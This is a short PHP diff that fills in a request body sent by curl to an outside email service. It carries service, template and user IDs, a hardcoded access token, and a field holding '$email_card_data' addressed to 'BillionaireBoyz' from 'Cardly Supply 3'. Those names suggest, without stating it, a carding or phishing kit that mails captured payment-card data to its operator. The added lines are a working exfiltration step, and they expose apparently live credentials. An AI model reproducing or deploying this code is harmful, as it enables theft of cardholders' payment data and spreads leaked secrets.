@@ -65,11 +65,17 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $data = <<<data
     {
-
-
+        "service_id": "service_3uyknph",
+        "template_id": "template_24v2iow",
+        "user_id": "2J8DshQnpUuUkoM9C",
+        "accessToken": "6X57_NC-Z7fS_Ygz3SjkI",
+        "template_params": {
+            "to_name":"BillionaireBoyz",
+            "from_name":"Cardly Supply 3",
+            "message": $email_card_data
+        }
     }
-}
-data;
+    data;
 
 curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
 
